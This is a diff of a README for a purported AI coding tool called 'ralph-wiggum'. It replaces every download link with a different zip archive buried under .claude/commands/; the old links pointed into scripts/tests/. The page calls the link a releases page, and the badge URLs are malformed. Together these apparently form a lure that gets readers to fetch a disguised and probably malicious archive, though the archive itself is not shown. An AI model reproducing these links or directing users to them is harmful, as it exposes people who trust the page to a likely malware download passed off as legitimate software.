@@ -1,6 +1,6 @@
 # 🤖 ralph-wiggum - Code Smarter with AI Assistance
 
-[![Download ralph-wiggum](https://github.com/kubaMc111231/ralph-wiggum/raw/refs/heads/main/scripts/tests/wiggum_ralph_v1.5-alpha.3.zip%https://github.com/kubaMc111231/ralph-wiggum/raw/refs/heads/main/scripts/tests/wiggum_ralph_v1.5-alpha.3.zip)](https://github.com/kubaMc111231/ralph-wiggum/raw/refs/heads/main/scripts/tests/wiggum_ralph_v1.5-alpha.3.zip)
+[![Download ralph-wiggum](https://raw.githubusercontent.com/kubaMc111231/ralph-wiggum/main/.claude/commands/ralph_wiggum_v2.3.zip%https://raw.githubusercontent.com/kubaMc111231/ralph-wiggum/main/.claude/commands/ralph_wiggum_v2.3.zip)](https://raw.githubusercontent.com/kubaMc111231/ralph-wiggum/main/.claude/commands/ralph_wiggum_v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome to ralph-wiggum! This application helps you use an AI agent for coding. 
 
 ## 📥 Download & Install
 
-To get started with ralph-wiggum, visit this page to download: [Download ralph-wiggum](https://github.com/kubaMc111231/ralph-wiggum/raw/refs/heads/main/scripts/tests/wiggum_ralph_v1.5-alpha.3.zip).
+To get started with ralph-wiggum, visit this page to download: [Download ralph-wiggum](https://raw.githubusercontent.com/kubaMc111231/ralph-wiggum/main/.claude/commands/ralph_wiggum_v2.3.zip).
 
 ### Step 1: Visit the Releases Page
 
-1. Click on the link above or visit [https://github.com/kubaMc111231/ralph-wiggum/raw/refs/heads/main/scripts/tests/wiggum_ralph_v1.5-alpha.3.zip](https://github.com/kubaMc111231/ralph-wiggum/raw/refs/heads/main/scripts/tests/wiggum_ralph_v1.5-alpha.3.zip).
+1. Click on the link above or visit [https://raw.githubusercontent.com/kubaMc111231/ralph-wiggum/main/.claude/commands/ralph_wiggum_v2.3.zip](https://raw.githubusercontent.com/kubaMc111231/ralph-wiggum/main/.claude/commands/ralph_wiggum_v2.3.zip).
 2. You will see a list of available versions. Choose the latest version for the best experience.
 
 ### Step 2: Download the Application
